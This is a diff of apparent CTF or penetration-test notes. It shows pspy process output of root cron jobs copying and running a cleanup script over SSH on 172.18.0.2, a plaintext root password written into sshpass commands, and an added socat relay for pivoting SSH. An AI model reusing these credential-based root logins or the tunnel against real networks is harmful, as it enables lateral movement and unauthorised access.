@@ -105,10 +105,21 @@ O - pspy64s
   O - sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/bug-feed root@172.18.0.2:/root/feeds/ 
     O - sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2
      X - there is an test rsa key at /tmp and it works? no
-      2020/09/05 18:19:01 CMD: UID=0    PID=62090  | scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh                                       
-      2020/09/05 18:19:01 CMD: UID=0    PID=62089  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh 
-      2020/09/05 18:19:01 CMD: UID=0    PID=62091  | /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -l root -- 172.18.0.2 scp -t /tmp/clear.sh 
+
+2020/09/05 18:37:01 CMD: UID=0    PID=81031  | scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh 
+2020/09/05 18:37:01 CMD: UID=0    PID=81030  | /bin/sh -c rm /opt/printer/logs/*.log 
+2020/09/05 18:37:01 CMD: UID=0    PID=81029  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh 
+2020/09/05 18:37:01 CMD: UID=0    PID=81032  | /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -l root -- 172.18.0.2 scp -t /tmp/clear.sh 
+2020/09/05 18:37:01 CMD: UID=0    PID=81033  | /usr/sbin/sshd -R 
+2020/09/05 18:37:01 CMD: UID=105  PID=81034  | sshd: [net]       
+2020/09/05 18:37:01 CMD: UID=0    PID=81049  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@172.18.0.2 /tmp/clear.sh 
+2020/09/05 18:37:01 CMD: UID=0    PID=81050  | ssh root@172.18.0.2 /tmp/clear.sh 
+2020/09/05 18:37:01 CMD: UID=0    PID=81051  | sshd: root [priv] 
+2020/09/05 18:37:01 CMD: UID=0    PID=81068  | ssh root@172.18.0.2 rm /tmp/clear.sh 
+2020/09/05 18:37:01 CMD: UID=0    PID=81067  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@172.18.0.2 rm /tmp/clear.sh 
+
      O - socat https://medium.com/@copyconstruct/socat-29453e9fc8a6
+          ./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.18.0.1:22
         
 
 
